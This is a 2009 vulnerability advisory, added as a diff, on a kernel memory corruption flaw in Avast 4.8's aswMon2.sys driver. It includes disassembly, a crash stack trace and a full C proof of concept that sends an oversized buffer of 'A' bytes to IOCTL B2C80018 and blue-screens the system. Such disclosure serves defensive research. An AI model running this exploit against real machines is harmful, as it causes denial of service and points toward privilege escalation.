@@ -1,0 +1,153 @@
+Source: https://www.evilfingers.com/advisory/Advisory/Avast_aswMon2.sys_kernel_memory_corruption_and_Local_Privilege_Escalation.php
+
+
+-----------[Avast aswMon2.sys kernel memory corruption and Local Privilege Escalation]--------->
+
+Author: Giuseppe 'Evilcry' Bonfa'
+E-Mail: evilcry {AT} GMAIL {DOT} COM<br>
+Website: http://evilcry.netsons.org<br>
+http://evilcodecave.blogspot.com<br>
+http://evilcodecave.wordpress.com<br>
+http://evilfingers.com<br>
+
+***Disclosure Timeline***
+Discover Date: Sep 13, 2009  PoC Code: Sep 13, 2009<br>
+Vendor Notify: Sep 15,2009   Vendor Reply: Sep 15, 2009<br><br>
+
+After various mails about publishing date
+ignored, here the Public Disclosure.
+
++--------------------------------------------------------------------------+
+Product: Avast antivirus 4.8.1351.0 (other versions could be affected)
+Affected Component: aswMon2.sys 4.8.1351.0
+Category: Local Denial of Service due to kernel memory corruption (BSOD)
+	 (untested) Local Privilege Escalation
+
++---------------------------------------------------------------------------+
+
+--------------------------[Details]--------------->
+
+Avast's aswMon2.sys Driver does not sanitize user supplied input IOCTL) and this lead to a kernel memory corruption that propagates 
+on the system with a BSOD and potential risk of Privilege Escalation.<br><br>
+
+00010F70    cmp     [ebp+arg_C], 288h   ;InBuff Len no other checks performed<br>
+00010F77    jnz     loc_111AC<br>
+00010F7D    mov     esi, [ebp+SourceString]<br>
+00010F80    cmp     [esi], ebx<br>
+00010F82    mov     [ebp+arg_C], ebx<br><br>
+
+
+Affected IOCTL is B2C80018<br><br>
+
+UNEXPECTED_KERNEL_MODE_TRAP_M (1000007f)<br><br>
+
+Transfer Type: METHOD_BUFFERED<br><br>
+
+STACK_TEXT:<br><br>
+
+WARNING: Stack unwind information not available. Following frames may be wrong.<br>
+f76f3234 8053d251 f76f3250 00000000 f76f32a4 nt+0x600fa<br>
+f76f32a4 8052c712 badb0d00 20a0a0a1 f76f5658 nt+0x66251<br>
+f76f3328 8052c793 41414141 00000000 f76f377c nt+0x55712<br>
+f76f33a4 804fc700 f76f377c f76f3478 05050505 nt+0x55793<br><br>
+.
+f76f56d8 f7756a04 badb0d00 8055b256 00000000 nt+0x66251<br>
+f76f576c 41414141 41414141 41414141 41414141 aswMon2+0xa04<br>
+f76f5770 41414141 41414141 41414141 41414141 0x41414141<br>
+f76f5774 41414141 41414141 41414141 41414141 0x41414141<br>
+f76f5778 41414141 41414141 41414141 41414141 0x41414141<br>
+f76f577c 41414141 41414141 41414141 41414141 0x41414141<br>
+f76f5780 41414141 41414141 41414141 41414141 0x41414141<br>
+.<br><br>
+
+
++---------------------------------------------------------------------------+
+
+/ * Avast 4.8.1351.0 antivirus aswMon2.sys Kernel Memory Corruption<br>
+ *<br>
+ * Author: Giuseppe 'Evilcry' Bonfa'<br>
+ * E-Mail: evilcry _AT_ gmail _DOT_ com<br>
+ * Website: http://evilcry.netsons.org<br>
+ *          http://evilcodecave.blogspot.com <br>
+ *	    http://evilfingers.com<br>
+ *<br>
+ * Vendor: Notified<br>
+ *<br>
+ * No L.P.E. for kiddies<br>
+ * /<br><br>
+
+#define WIN32_LEAN_AND_MEAN<br>
+#include < windows.h><br>
+#include < stdio.h><br><br>
+
+
+BOOL OpenDevice(PWSTR DriverName, HANDLE *lphDevice) //taken from esagelab<br>
+{<br>
+	WCHAR DeviceName[MAX_PATH];<br>
+	HANDLE hDevice;<br>
+
+	if ((GetVersion() & 0xFF) >= 5) <br>
+	{<br>
+		wcscpy(DeviceName, L"\\\\.\\Global\\");<br>
+	} <br>
+	else <br>
+	{<br>
+		wcscpy(DeviceName, L"\\\\.\\");<br>
+	}<br><br>
+
+	wcscat(DeviceName, DriverName);<br>
+
+	printf("Opening.. %S\n", DeviceName);<br>
+
+	hDevice = CreateFileW(DeviceName, GENERIC_READ | <br>
+	GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 
+		FILE_ATTRIBUTE_NORMAL, NULL);<br><br>
+
+	if (hDevice == INVALID_HANDLE_VALUE)<br>
+	{<br>
+		printf("CreateFile() ERROR %d\n", GetLastError());<br>
+		return FALSE;<br>
+	}<br><br>
+
+	*lphDevice = hDevice;<br>
+
+	return TRUE;<br>
+}<br><br>
+
+int main()<br>
+{<br>
+	HANDLE hDev = NULL;<br>
+	DWORD Junk;<br>
+
+	if(!OpenDevice(L"aswMon",&hDev))<br>
+	{<br>
+		printf("Unable to access aswMon");<br>
+		return(0);<br>
+	}<br><br>
+
+	char *Buff = (char *)VirtualAlloc(NULL, 0x288, MEM_RESERVE | <br>
+	MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>
+
+	if (Buff)<br>
+	{<br>
+		memset(Buff, 'A', 0x288);<br>
+		DeviceIoControl(hDev,0xB2C80018,Buff,
+		0x288,Buff,0x288,&Junk,(LPOVERLAPPED)NULL);<br>
+		printf("DeviceIoControl Executed..\n");	<br>	
+	}    <br>
+	else<br>
+	{<br>
+		printf("VirtualAlloc() ERROR %d\n", GetLastError());<br>
+	}<br>
+
+
+	return(0);<br>
+}<br><br>
+
+
+
++---------------------------------------------------------------------------+
+
+
+Regards,
+Giuseppe 'Evilcry' Bonfa'
